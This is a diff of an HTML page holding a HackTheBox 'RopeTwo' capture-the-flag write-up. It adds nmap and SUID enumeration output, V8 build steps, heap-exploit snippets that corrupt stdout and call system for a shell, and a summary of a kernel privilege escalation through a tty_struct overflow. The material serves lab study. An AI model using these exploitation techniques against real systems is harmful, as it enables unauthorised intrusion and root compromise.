@@ -437,14 +437,14 @@
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>Word Count:&nbsp;&nbsp;
-                    6.7k
+                    7.4k
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>Read Times:&nbsp;&nbsp;
-                    42 Min
+                    46 Min
                 </div>
                 
 
@@ -466,28 +466,54 @@
             <div id="articleContent">
                 <p>This box was without a second thought one of the favourite box of mine on HackTheBox so far, since I am more of a pwn and reverse engineering person, this machine was a challenge, an outstanding one which pushed my learning skills more further because upto the moment I really went into this, I was not a good at heap exploitation, more skeptical about the V8 exploitation skills of mine and of course I knew nothing of the kernel pwn, so this was a way to tackle every weakness of mine, hope you find the writeup useful, I’ll include the link of the attachments at the very bottom to my files, QEMU enviornment for the kernel pwn and the exploits, without further ado, let’s start.</p>
 <h1 id="Foothold"><a href="#Foothold" class="headerlink" title="Foothold"></a>Foothold</h1><p>So, as this became kind of obvious that the foothold required the V8 exploitation as the rumors went by. But apart from that, I started scanning the ports as I was unclear myself where and how things are on this machine, now starting off, I used nmap to scan the ports:-</p>
-<pre><code>NMAP
-</code></pre><p>The port 22 was open, being the SSh, the other two were the ones running the webserver, port 5000 was running the GitLab and the port 8000 running a webserver.<br>Checking the port 5000:</p>
-<p><em>port 8000 image here</em></p>
-<p>It seemed like the portfolio for a company showing their own version of V8 engine, which is the JavaScript Engine for the chromium based browsers, there was a download link for the browser, so without any second thought I downloaded it.</p>
-<p>From the name of the archive it seemed like the chromium browser compressed into the POSIX tar archive, after extracting it seemed like the chromium browser as we expected it to be, although running it, just spawned the chromium browser, so that was it, nothing special came out of this. </p>
-<p>_run_chrome_browser_image</p>
-<p>Now, that being aside, the only port that was </p>
-<the journey to find the commit>
----
+<pre class=" language-r"><code class="language-r">➜ ✔ nmap <span class="token operator">-</span>sV <span class="token operator">-</span>sC <span class="token operator">-</span>A <span class="token number">10.10</span>.<span class="token number">10.196</span>
+Starting Nmap <span class="token number">7.80</span> <span class="token punctuation">(</span> https<span class="token operator">:</span><span class="token operator">/</span><span class="token operator">/</span>nmap.org <span class="token punctuation">)</span> at <span class="token number">2021</span><span class="token operator">-</span><span class="token number">01</span><span class="token operator">-</span><span class="token number">16</span> <span class="token number">21</span><span class="token operator">:</span><span class="token number">57</span> IST
+Nmap scan report <span class="token keyword">for</span> <span class="token number">10.10</span>.<span class="token number">10.196</span>
+Host is up <span class="token punctuation">(</span><span class="token number">0</span>.83s latency<span class="token punctuation">)</span>.
+Not shown<span class="token operator">:</span> <span class="token number">997</span> closed ports
+PORT     STATE SERVICE VERSION
+<span class="token number">22</span><span class="token operator">/</span>tcp   open  ssh     OpenSSH <span class="token number">7.9p1</span> Ubuntu <span class="token number">10</span> <span class="token punctuation">(</span>Ubuntu Linux<span class="token punctuation">;</span> protocol <span class="token number">2.0</span><span class="token punctuation">)</span>
+<span class="token operator">|</span> ssh<span class="token operator">-</span>hostkey<span class="token operator">:</span> 
+<span class="token operator">|</span>   <span class="token number">2048</span> bc<span class="token operator">:</span>d9<span class="token operator">:</span><span class="token number">40</span><span class="token operator">:</span><span class="token number">18</span><span class="token operator">:</span>5e<span class="token operator">:</span>2b<span class="token operator">:</span>2b<span class="token operator">:</span><span class="token number">12</span><span class="token operator">:</span>3d<span class="token operator">:</span>0b<span class="token operator">:</span>1f<span class="token operator">:</span>f3<span class="token operator">:</span>6f<span class="token operator">:</span><span class="token number">03</span><span class="token operator">:</span>1b<span class="token operator">:</span>8f <span class="token punctuation">(</span>RSA<span class="token punctuation">)</span>
+<span class="token operator">|</span>   <span class="token number">256</span> <span class="token number">15</span><span class="token operator">:</span><span class="token number">23</span><span class="token operator">:</span>6f<span class="token operator">:</span>a6<span class="token operator">:</span>d8<span class="token operator">:</span><span class="token number">13</span><span class="token operator">:</span>6e<span class="token operator">:</span>c4<span class="token operator">:</span>5b<span class="token operator">:</span>c5<span class="token operator">:</span>4a<span class="token operator">:</span>6f<span class="token operator">:</span>5a<span class="token operator">:</span>6b<span class="token operator">:</span>0b<span class="token operator">:</span>4d <span class="token punctuation">(</span>ECDSA<span class="token punctuation">)</span>
+<span class="token operator">|</span>_  <span class="token number">256</span> <span class="token number">83</span><span class="token operator">:</span><span class="token number">44</span><span class="token operator">:</span>a5<span class="token operator">:</span>b4<span class="token operator">:</span><span class="token number">88</span><span class="token operator">:</span>c2<span class="token operator">:</span>e9<span class="token operator">:</span><span class="token number">28</span><span class="token operator">:</span><span class="token number">41</span><span class="token operator">:</span>6a<span class="token operator">:</span>da<span class="token operator">:</span>9e<span class="token operator">:</span>a8<span class="token operator">:</span>3a<span class="token operator">:</span><span class="token number">10</span><span class="token operator">:</span><span class="token number">90</span> <span class="token punctuation">(</span>ED25519<span class="token punctuation">)</span>
+<span class="token number">5000</span><span class="token operator">/</span>tcp open  http    nginx
+<span class="token operator">|</span> http<span class="token operator">-</span>robots.txt<span class="token operator">:</span> <span class="token number">55</span> disallowed entries <span class="token punctuation">(</span><span class="token number">15</span> shown<span class="token punctuation">)</span>
+<span class="token operator">|</span> <span class="token operator">/</span> <span class="token operator">/</span>autocomplete<span class="token operator">/</span>users <span class="token operator">/</span>search <span class="token operator">/</span>api <span class="token operator">/</span>admin <span class="token operator">/</span>profile 
+<span class="token operator">|</span> <span class="token operator">/</span>dashboard <span class="token operator">/</span>projects<span class="token operator">/</span>new <span class="token operator">/</span>groups<span class="token operator">/</span>new <span class="token operator">/</span>groups<span class="token operator">/</span><span class="token operator">*</span><span class="token operator">/</span>edit <span class="token operator">/</span>users <span class="token operator">/</span>help 
+<span class="token operator">|</span>_<span class="token operator">/</span>s<span class="token operator">/</span> <span class="token operator">/</span>snippets<span class="token operator">/</span>new <span class="token operator">/</span>snippets<span class="token operator">/</span><span class="token operator">*</span><span class="token operator">/</span>edit
+<span class="token operator">|</span> http<span class="token operator">-</span>title<span class="token operator">:</span> Sign <span class="token keyword">in</span> \xC2\xB7 GitLab
+<span class="token operator">|</span>_Requested resource was http<span class="token operator">:</span><span class="token operator">/</span><span class="token operator">/</span><span class="token number">10.10</span>.<span class="token number">10.196</span><span class="token operator">:</span><span class="token number">5000</span><span class="token operator">/</span>users<span class="token operator">/</span>sign_in
+<span class="token operator">|</span>_http<span class="token operator">-</span>trane<span class="token operator">-</span>info<span class="token operator">:</span> Problem with XML parsing of <span class="token operator">/</span>evox<span class="token operator">/</span>about
+<span class="token number">8000</span><span class="token operator">/</span>tcp open  http    Werkzeug httpd <span class="token number">0.14</span>.<span class="token number">1</span> <span class="token punctuation">(</span>Python <span class="token number">3.7</span>.<span class="token number">3</span><span class="token punctuation">)</span>
+<span class="token operator">|</span>_http<span class="token operator">-</span>server<span class="token operator">-</span>header<span class="token operator">:</span> Werkzeug<span class="token operator">/</span><span class="token number">0.14</span>.<span class="token number">1</span> Python<span class="token operator">/</span><span class="token number">3.7</span>.<span class="token number">3</span>
+<span class="token operator">|</span>_http<span class="token operator">-</span>title<span class="token operator">:</span> Home
+Service Info<span class="token operator">:</span> OS<span class="token operator">:</span> Linux<span class="token punctuation">;</span> CPE<span class="token operator">:</span> cpe<span class="token operator">:</span><span class="token operator">/</span>o<span class="token operator">:</span>linux<span class="token operator">:</span>linux_kernel
 
+Service detection performed. Please report any incorrect results at https<span class="token operator">:</span><span class="token operator">/</span><span class="token operator">/</span>nmap.org<span class="token operator">/</span>submit<span class="token operator">/</span> .
+Nmap done<span class="token operator">:</span> <span class="token number">1</span> IP address <span class="token punctuation">(</span><span class="token number">1</span> host up<span class="token punctuation">)</span> scanned <span class="token keyword">in</span> <span class="token number">141.64</span> seconds
+</code></pre>
+<p>The port 22 was open, being the SSh, the other two were the ones running the webserver, port 5000 was running the GitLab and the port 8000 running a webserver.<br>Checking the port 5000:</p>
+<p><img src="/img/ropetwo/8000.png" alt><br>It seemed like the portfolio for a company showing their own version of V8 engine, which is the JavaScript Engine for the chromium based browsers, there was a download link for the browser, so without any second thought I downloaded it.</p>
+<p>From the name of the archive it seemed like the chromium browser compressed into the POSIX tar archive, after extracting it seemed like the chromium browser as we expected it to be, although running it, just spawned the chromium browser, so that was it, nothing special came out of this. </p>
+<p>Now, that being aside, the only port that was 8000, we had a link at the footer of the page which said <strong>Source</strong>, opening the link, we immediately see a subdomain <code>gitlab.ropetwo.htb</code>, which was as follows:-</p>
+<p><img src="/img/ropetwo/gitlab.png" alt></p>
+<p>We immediately, sees a commit which was made, as I did some v8 pwn, I went to check on commit and found the <code>diff</code> file, using so, I moved further and started building v8 engine binary d8, I used the commit, prior to the <code>r4j</code> user made, which was at <a href="http:///gitlab.rope2.htb:5000/root/v8/commit/d91e8d8fca64679c8df05603b5ff7e58709c4801" target="_blank" rel="noopener">here</a></p>
 <p>Now, first of all, we didn’t has much thing to get started, as for starting to pwn the v8 engine of it, we had to build the binary named <code>d8</code>, since that was not provided. I fetched the v8 engine code from the google and checkout the last commit which was mentioned in the GitLab, following are the steps one could replicate to make their own version of the d8 by applying the <code>diff</code> file.</p>
 <pre class=" language-r"><code class="language-r">d4mian<span class="token operator">@</span>pwnbox<span class="token operator">:</span><span class="token operator">~</span><span class="token operator">$</span> fetch v8
 d4mian<span class="token operator">@</span>pwnbox<span class="token operator">:</span><span class="token operator">~</span><span class="token operator">$</span> cd v8
 d4mian<span class="token operator">@</span>pwnbox<span class="token operator">:</span><span class="token operator">~</span><span class="token operator">/</span>v8<span class="token operator">$</span> .<span class="token operator">/</span>build<span class="token operator">/</span>install<span class="token operator">-</span>build<span class="token operator">-</span>deps.sh    
-d4mian<span class="token operator">@</span>pwnbox<span class="token operator">:</span><span class="token operator">~</span><span class="token operator">/</span>v8<span class="token operator">$</span> git checkout d91e8d8fca64679c8df05603b5ff7e58709c4801 <span class="token comment" spellcheck="true"># Commit was mentioned in the challenge </span>
+d4mian<span class="token operator">@</span>pwnbox<span class="token operator">:</span><span class="token operator">~</span><span class="token operator">/</span>v8<span class="token operator">$</span> git checkout d91e8d8fca64679c8df05603b5ff7e58709c4801
 d4mian<span class="token operator">@</span>pwnbox<span class="token operator">:</span><span class="token operator">~</span><span class="token operator">/</span>v8<span class="token operator">$</span> gclient sync
-d4mian<span class="token operator">@</span>pwnbox<span class="token operator">:</span><span class="token operator">~</span><span class="token operator">/</span>v8<span class="token operator">$</span> git apply ..<span class="token operator">/</span>patch.diff <span class="token comment" spellcheck="true"># Path to the patch file provided</span>
+d4mian<span class="token operator">@</span>pwnbox<span class="token operator">:</span><span class="token operator">~</span><span class="token operator">/</span>v8<span class="token operator">$</span> git apply ..<span class="token operator">/</span>patch.diff 
 d4mian<span class="token operator">@</span>pwnbox<span class="token operator">:</span><span class="token operator">~</span><span class="token operator">/</span>v8<span class="token operator">$</span> .<span class="token operator">/</span>tools<span class="token operator">/</span>dev<span class="token operator">/</span>v8gen.py x64.release
 d4mian<span class="token operator">@</span>pwnbox<span class="token operator">:</span><span class="token operator">~</span><span class="token operator">/</span>v8<span class="token operator">$</span> ninja <span class="token operator">-</span>C .<span class="token operator">/</span>out.gn<span class="token operator">/</span>x64.release
 d4mian<span class="token operator">@</span>pwnbox<span class="token operator">:</span><span class="token operator">~</span><span class="token operator">/</span>v8<span class="token operator">$</span> .<span class="token operator">/</span>tools<span class="token operator">/</span>dev<span class="token operator">/</span>v8gen.py x64.debug
 d4mian<span class="token operator">@</span>pwnbox<span class="token operator">:</span><span class="token operator">~</span><span class="token operator">/</span>v8<span class="token operator">$</span> ninja <span class="token operator">-</span>C .<span class="token operator">/</span>out.gn<span class="token operator">/</span>x64.debug</code></pre>
 <p>This took some time, approximately 3 hours on my VM which had 3GB of RAM and 1 core, though I made both the debug version and release version, but the release version was more helpful because before doing this v8 exploitation challenge, I did the DownUnderCTF’s “Is it Pwn or Web?” challenge which was close to same to this one, that being said, let’s get started.</p>
+<blockquote>
+<p>Attachment: The <code>d8</code> binary and the exploits can be found here: <a href="https://github.com/D4mianWayne/PwnLand/tree/master/CTFs/RopeTwo_HackTheBox/Foothold" target="_blank" rel="noopener">https://github.com/D4mianWayne/PwnLand/tree/master/CTFs/RopeTwo_HackTheBox/Foothold</a></p>
+</blockquote>
 <h5 id="Obstacle-Pointer-Compression"><a href="#Obstacle-Pointer-Compression" class="headerlink" title="Obstacle: Pointer Compression"></a>Obstacle: Pointer Compression</h5><p>The only obstacle one would really stumble upon during this challenge is the use of the Pointer Compression, this made the address representation in 32 bit, which resulted in the leak being hard to make something of, since the isolate root, the upper 32 bit value of an address which is used to access the data around the V8 heap turned out to be an issue. But going through this <a href>blog</a>, this mentioned that we do not need to know about the isolate root address, if we could manage to massage the vulnerability to get <code>fakeobj</code> and the <code>addrof</code> primitive, then we can get through the pointer compression which would result in not being a problem.</p>
 <h5 id="Patch"><a href="#Patch" class="headerlink" title="Patch"></a>Patch</h5><p>First of all, we need to analyse the patch file such that we spot which commit specifically pushed changes and pushed it where exactly:-</p>
 <pre class=" language-diff"><code class="language-diff">~/Pwning/HackTheBox/htb-rope2 $ cat patch.diff 
@@ -618,7 +644,7 @@ index 7fd1e40f661461fdbcf9228c5ce9127c3428dc7b..3a9b97e4b6426e101ca0cdc97ce1cc92
 </ul>
 <p>So, as above mentioned we know that there are 2 functions that we have use in order to exploit this specific patch of the binary and eventually the chrome browser.</p>
 <p>As this is also going to be very detailed blog post, we will understand the concepts first then we will move on eventually.</p>
-<h5 id="Maps"><a href="#Maps" class="headerlink" title="Maps"></a>Maps</h5><p>As JavaScript is a dynamically typed language, the engine must store type information with every runtime value. In v8, this is accomplished through a combination of pointer tagging and the use of dedicated type information objects, called Maps. These Maps are used to keep the track of the objects created at runtime, since this is how objects are handle, overwriting the map would lead to some internal type confusion within the V8 engine itself.<br>As of now, you might be thinking how exactly we access Maps and most importantly “How do we recognize a Map?”, for this I used the debug version of the <code>d8</code> binary. that binary when run with the <code>allow-natives-syntax</code> will let you use the <code>%DebugPrint(&lt;object&gt;)</code> which will print the related information of the objects, let’s say, for example, we declared the array with the elements and then use the <code>%DebugPrint(arr)</code> to get all the information about an objects including but not limited to:-</p>
+<p>As JavaScript is a dynamically typed language, the engine must store type information with every runtime value. In v8, this is accomplished through a combination of pointer tagging and the use of dedicated type information objects, called Maps. These Maps are used to keep the track of the objects created at runtime, since this is how objects are handle, overwriting the map would lead to some internal type confusion within the V8 engine itself.<br>As of now, you might be thinking how exactly we access Maps and most importantly “How do we recognize a Map?”, for this I used the debug version of the <code>d8</code> binary. that binary when run with the <code>allow-natives-syntax</code> will let you use the <code>%DebugPrint(&lt;object&gt;)</code> which will print the related information of the objects, let’s say, for example, we declared the array with the elements and then use the <code>%DebugPrint(arr)</code> to get all the information about an objects including but not limited to:-</p>
 <ul>
 <li>Map address</li>
 <li>Element Pointer</li>
@@ -1033,10 +1059,40 @@ console<span class="token punctuation">.</span><span class="token function">log<
 
 console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"[+] Spawning a shell..."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 <span class="token function">pwn</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>
+<p><img src="/img/ropetwo/foothold.png" alt></p>
 <h1 id="User"><a href="#User" class="headerlink" title="User"></a>User</h1><p>After getting the foothold on the machine as <code>chromeuser</code>, looking over in the <code>/home</code> folder there were two directories which include <code>r4j</code> and <code>chromeuser</code> and since the <code>/home/chromeuser</code> didn’t had <code>user.txt</code> or anything else that would hint towards something, I started doing the basic enumeration for finding the SUID binaries, which showed the following binaries:-</p>
-<pre class=" language-r"><code class="language-r">list_of_suid</code></pre>
+<p><img src="/img/ropetwo/ssh.png" alt></p>
+<pre class=" language-r"><code class="language-r">chromeuser<span class="token operator">@</span>rope2<span class="token operator">:</span><span class="token operator">~</span><span class="token operator">$</span> find <span class="token operator">/</span> <span class="token operator">-</span>perm <span class="token operator">-</span>u<span class="token operator">=</span>s <span class="token operator">-</span>type f <span class="token number">2</span><span class="token operator">></span><span class="token operator">/</span>dev<span class="token operator">/</span>null
+<span class="token operator">/</span>usr<span class="token operator">/</span>lib<span class="token operator">/</span>openssh<span class="token operator">/</span>ssh<span class="token operator">-</span>keysign
+<span class="token operator">/</span>usr<span class="token operator">/</span>lib<span class="token operator">/</span>eject<span class="token operator">/</span>dmcrypt<span class="token operator">-</span>get<span class="token operator">-</span>device
+<span class="token operator">/</span>usr<span class="token operator">/</span>lib<span class="token operator">/</span>dbus<span class="token operator">-</span><span class="token number">1.0</span><span class="token operator">/</span>dbus<span class="token operator">-</span>daemon<span class="token operator">-</span>launch<span class="token operator">-</span>helper
+<span class="token operator">/</span>usr<span class="token operator">/</span>bin<span class="token operator">/</span>newgrp
+<span class="token operator">/</span>usr<span class="token operator">/</span>bin<span class="token operator">/</span>fusermount
+<span class="token operator">/</span>usr<span class="token operator">/</span>bin<span class="token operator">/</span>rshell
+<span class="token operator">/</span>usr<span class="token operator">/</span>bin<span class="token operator">/</span>mount
+<span class="token operator">/</span>usr<span class="token operator">/</span>bin<span class="token operator">/</span>at
+<span class="token operator">/</span>usr<span class="token operator">/</span>bin<span class="token operator">/</span>chfn
+<span class="token operator">/</span>usr<span class="token operator">/</span>bin<span class="token operator">/</span>passwd
+<span class="token operator">/</span>usr<span class="token operator">/</span>bin<span class="token operator">/</span>gpasswd
+<span class="token operator">/</span>usr<span class="token operator">/</span>bin<span class="token operator">/</span>umount
+<span class="token operator">/</span>usr<span class="token operator">/</span>bin<span class="token operator">/</span>chsh
+<span class="token operator">/</span>usr<span class="token operator">/</span>bin<span class="token operator">/</span>su
+<span class="token operator">/</span>usr<span class="token operator">/</span>bin<span class="token operator">/</span>sudo
+</code></pre>
 <p>Out of all the listed binaries, the <code>rshell</code> stood out the most, running the binary was functioning as follows:-</p>
-<pre class=" language-r"><code class="language-r">snippet of the rshell binary running</code></pre>
+<pre class=" language-r"><code class="language-r">chromeuser<span class="token operator">@</span>rope2<span class="token operator">:</span><span class="token operator">~</span><span class="token operator">$</span> <span class="token operator">/</span>usr<span class="token operator">/</span>bin<span class="token operator">/</span>rshell
+<span class="token operator">$</span> ls
+<span class="token operator">$</span> add <span class="token number">1</span>
+size<span class="token operator">:</span> <span class="token number">100</span>
+content<span class="token operator">:</span> sss
+<span class="token operator">$</span> ls
+<span class="token number">1</span>
+<span class="token operator">$</span> whoami
+r4j
+<span class="token operator">$</span> id
+uid<span class="token operator">=</span><span class="token number">1000</span><span class="token punctuation">(</span>r4j<span class="token punctuation">)</span> gid<span class="token operator">=</span><span class="token number">1000</span><span class="token punctuation">(</span>r4j<span class="token punctuation">)</span> groups<span class="token operator">=</span><span class="token number">1000</span><span class="token punctuation">(</span>r4j<span class="token punctuation">)</span>
+<span class="token operator">$</span> <span class="token operator">^</span>C
+chromeuse</code></pre>
 <p>Knowing the author, I assumed this <code>rshell</code> binary is going to be about binary exploitation, this meant it was time to transfer it to the machine of mine and start to dissect it to know the flow of it.</p>
 <hr>
 <h5 id="main-function"><a href="#main-function" class="headerlink" title="main function"></a><code>main</code> function</h5><pre class=" language-C"><code class="language-C">void __fastcall __noreturn main(__int64 a1, char **a2, char **a3)
@@ -1386,7 +1442,7 @@ allocate(1, 0x68, b"C"*0x18+p64(0x451))</code></pre>
   allocate(1, 0x58, "D")
   realloc(1, 0x70, "D")
   free(1)</code></pre>
-<p>Doing so, the <code>tcvache</code> bin structure becomes:-</p>
+<p>Doing so, the <code>tcache</code> bin structure becomes:-</p>
 <p><img src="/img/ropetwo/loop.png" alt></p>
 <p>Then, we allocate a chunk of size <code>0x58</code> which will retrieve the chunk from the <code>tcache bin[3]</code>. Now, what we do here is free the chunk saved at the index 1, then the chunk which was allocated at the index <code>0</code> of the global array, we <code>free</code> it with the <code>realloc</code>, now doing so, since the chunk at that index had the size <code>0x451</code> which is more than the <code>tcache</code> structure can hold, this will make them land into the unsorted bin.</p>
 <pre class=" language-py"><code class="language-py">allocate(1, 0x58, "A")
@@ -1395,7 +1451,7 @@ realloc(0, 0, "")</code></pre>
 <p>Now, doing so, the chunk <code>0x5555555592d0</code> went into the unsorted bin, this chunk remain in the <code>tcache</code> and the <code>unsorted</code> bin:-</p>
 <p><img src="/img/ropetwo/unsorted.png" alt></p>
 <p>Now, since the chunk belongs to <code>unsorted</code> bin, we can edit the <code>fd</code> and <code>bk</code> of it because of the <strong>Use After Free&amp;</strong>, now then, as there’s no show function, we populate the <code>fd</code> of that <code>free</code>‘d chunk in the <code>_IO_2_1_stdout_</code> and the next time, we allocate the chunk, we will get the structure of the <code>_IO_2_1_stdout_</code> which we will be able to modify.</p>
-<pre class=" language-py"><code class="language-py">realloc(0, 0x38, p16(0x2760))</code></pre>
+<pre class=" language-py"><code class="language-py">realloc(0, 0x38, p16(0xc760)) # ASLR disabled</code></pre>
 <p><img src="/img/ropetwo/stdout.png" alt></p>
 <p>Now, we have to allocate chunk carefully since at this point the structure of the heap is not very good, doing anything reckless will mess up the exploit further. Now, what we do is again, allocate a chunk at the index 1, then reallocate the same chunk by shrinking it’s size to smaller than it was allocate to, and <code>free</code>‘ing it, now, when we try to reallocate the chunk 0, to a more smaller size and then <code>free</code> it, doing so, will make the <code>_IO_2_1_stdout_</code> address to the top of the index 3rd of the <code>tcache</code> bin list:-</p>
 <pre class=" language-py"><code class="language-py">allocate(1, 0x48, "E")
@@ -1441,8 +1497,17 @@ allocate(1, 0x58, b"/bin/sh\x00" + p64(libc.sym['system']))</code></pre>
 <pre class=" language-py"><code class="language-py">p.sendlineafter("$ ", "rm 1")
 p.interactive()</code></pre>
 <p><img src="/img/ropetwo/shell.png" alt></p>
-<p>The final script for the remote server can be found <a href>here</a></p>
-</the>
+<p>The final script for the remote server can be found <a href="https://github.com/D4mianWayne/PwnLand/tree/master/CTFs/RopeTwo_HackTheBox/User" target="_blank" rel="noopener">here</a></p>
+<p>Running the remote exploit, since ASLR was enabled on the server, we have to bruteforce the last 4 bytes of the <code>_IO_2_1_stdout_</code>, in my case I had the issue with the LIBC leak, with the help of the <a href="https://willsroot.io" target="_blank" rel="noopener">FizzBuzz</a>, using the last bytes as <code>p16(0x2760)</code>, doing that so and running the exploit in <code>while</code> loop, I got the shell with 40-60 tries:-</p>
+<blockquote>
+<p>Issue, after getting the shell as the user <code>r4j</code>, I couldn’t read the <code>user.txt</code> which was because of the groups I belonged, using the <code>newgrp</code> and leveraging to the <code>r4j</code> group, I was able to read the user flag.</p>
+</blockquote>
+<p><img src="/img/ropetwo/user.png" alt></p>
+<p>Now, being the user <code>r4j</code> didn’t really gave much away with basic enumeration and as I knew that the fact of the root part being the kernel, I went in and checked for the <code>/dev/</code> to look for any suspicious driver, in this case the only thing that stood out more than the other was, <code>ralloc</code>.</p>
+<p>The files for root exploitation can be found <a href="https://github.com/D4mianWayne/PwnLand/tree/master/CTFs/RopeTwo_HackTheBox/Root" target="_blank" rel="noopener">here</a>.</p>
+<p>I used the <code>tty_struct</code> as the allocation function of the <code>ralloc</code> device had a 32 byte overflow to the heap region which allowed me to overwrite the <code>ptm_unix98_ops</code> and replace it with a crafted <code>tty_struct</code>, hence, I overwrote the RIP with the <code>xchg eax, esp</code> and <code>mmap</code>‘d a chunk shared between the region, which had the payload stored, which did <code>prepare_kernel_cred(commit_cred(0))</code> which would leverage the privileges to the root and calling a userland function which did <code>system(&quot;/bin/sh&quot;)</code>, compiling the exploit as <code>gcc -static -masm=intel xploit.c -o xploit</code> .</p>
+<p><img src="/img/ropetwo/root.png" alt></p>
+
                 
             </div>
             <hr/>
@@ -1916,7 +1981,7 @@ p.interactive()</code></pre>
             <br>
             
             &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                class="white-color">43.9k</span>&nbsp;字
+                class="white-color">44.6k</span>&nbsp;字
             
             
             
